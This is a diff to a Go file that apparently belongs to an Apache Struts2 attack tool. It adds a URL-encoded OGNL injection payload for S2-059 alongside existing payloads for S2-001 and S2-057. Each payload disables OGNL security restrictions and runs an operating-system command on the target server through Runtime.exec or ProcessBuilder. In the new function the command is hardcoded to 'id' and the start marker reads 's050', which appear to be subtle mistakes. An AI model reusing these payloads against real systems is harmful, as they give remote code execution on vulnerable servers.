@@ -43,6 +43,7 @@ var (
 	POC_s053_check = "%25%7B3154%2B3154%7D%0D"
 	//POC_s057_check = "/%24%7B3154%2b3154%7D"
 	POC_s057_check = "/%24%7B3154%2B3154%7D"
+	POC_s059_check = "%25%7B3154*3154%7D"
 )
 func POC_s001_exec(command string) string{
 	return "%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22"+command+"%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b100%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(%22s001execstart%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().println(%22s001execend%22)%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d"
@@ -91,6 +92,10 @@ func POC_s053_exec(command string) string{
 }
 func POC_s057_exec(command string) string{
 	return "/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27"+command+"%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
+}
+
+func POC_s059_exec(command string) string {
+	return "%25%7B%0A%28%23dm%3D%40ognl%2EOgnlContext%40DEFAULT%5FMEMBER%5FACCESS%29%2E%0A%28%23ct%3D%23request%5B%27struts%2EvalueStack%27%5D%2Econtext%29%2E%0A%28%23cr%3D%23ct%5B%27com%2Eopensymphony%2Exwork2%2EActionContext%2Econtainer%27%5D%29%2E%0A%28%23ou%3D%23cr%2EgetInstance%28%40com%2Eopensymphony%2Exwork2%2Eognl%2EOgnlUtil%40class%29%29%2E%0A%28%23ou%2EsetExcludedPackageNames%28%27%27%29%29%2E%28%23ou%2EsetExcludedClasses%28%27%27%29%29%2E%0A%28%23ct%2EsetMemberAccess%28%23dm%29%29%2E%0A%28%23a%3D%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%29%2E%0A%28%27s050execstart%27%2B%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%23a%2EgetInputStream%28%29%29%2B%27s059execend%27%29%0A%7D"
 }
 
 func parseCommand(command string) string {
